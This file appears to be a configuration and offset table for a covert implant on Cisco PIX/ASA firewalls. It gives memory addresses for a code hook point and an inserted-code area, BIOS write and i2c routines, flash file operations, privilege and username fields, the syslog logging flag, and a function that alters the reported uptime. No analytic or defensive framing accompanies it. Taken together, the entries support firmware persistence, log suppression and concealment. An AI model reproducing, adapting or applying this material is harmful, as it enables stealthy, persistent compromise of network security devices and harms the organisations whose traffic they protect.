; --- SECTION I ---
;
0x40080420            // pix version
0x1d16000             // address of implant configuration
0x45  0x01a24638      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x085086e0      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0867c6da      // address of our hook point
HookedCall                0x0867fff0      // called function being hooked
JmpLocation               0x090b47fa      // empty area to jump to
InterfaceAddr             0x09761b64      // same as 0x30 above
InterfaceLeng             0x00000214      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x000001e4      // interface name field offset
IntNumOffset              0x0000014f      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x09b8b544      // addr of crypto structure
ArpTableAddrPtr           0x09751b08      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09b976e0      // addr of the bios class structure
BiosWriteAddr1            0x08369650      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x0836be40      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x0836b8d0      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x0836c720      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x0842eb30      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress      0x083712c0      // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress      0x08358f50      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress     0x08370db0      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress     0x08358c30      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress       0x0842e220      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress       0x0842ee10      // ifs_get_size; get the size of the provided open file
FlashChmodAddress         0x0842e6c0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress      0x0842e820      // ifs_rename; move a file
FlashGetFileInfoAddress   0x00000000      // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress      0x0842fc90      // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset   0x0000002c      // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr     0x091c12c0      // The address of a function that returns the platform string 
ASARestatFlashFlagAddr    0xffffffff      // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc              0x08061790      // addr of the device announce function
DevIoctlOffset            0x70            // offset to ioctl function in device table
DuartTtyAddr              0x096bf220      // addr of duart/0 tty entry
CIStartFunc               0x080b3880      // addr of the command interface start function -- telnet function
CommandListAddr           0x0978b3a0      // addr of the command list -- first parameter of ci
DeviceListPtrAddr         0x09a72448      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset       0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr            0x091b5bc0      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr         0x09d054e0      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue               0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue              0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue               0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset               0x84            // Offset into a thread struct containing the stdch pointer
StdErrOffset              0x88            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset            0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset               0x14            // offset into an environment struct containing the username 
EnvPtrOffset              0x90            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset              0x00000b3c      // offset into the syslog structure where the logging level is stored
Open                      0x080619a0      // open
ChannelConfigOffset       0x08            // offset into a channel where the configuration pointer is
InputModeOffset           0x14            // offset into a duart config structure where the input mode is stored
InputModeEsc              0x20            // Input mode used for entering escape sequence
WatchDogTimeout           0x0968b540      // Address where the thread timeout value is stored 
UpTimeCounter             0x09b85ba0      // Address of the up time counter
Display_uptime_addr       0x080bcb90      // Address of the function that display the uptime
Inserted_code_addr        0x090b47fa      // Address of the our insterted function to add time to the uptime
i2cReadByte               0x08dba660      // read byte function needed to operate on the bios of the asa 5505
i2cWriteByte              0x08dba4e0      // write byte function needed to operate on the bios of the asa 5505
CLIHookAddress            0x080b3d3a      // Address of hook into the command interface
AvailMemoryPtr            0x09c97340      // Address of total available memory
;
; --- END OF SECTION II ---
;
:EOS:
;
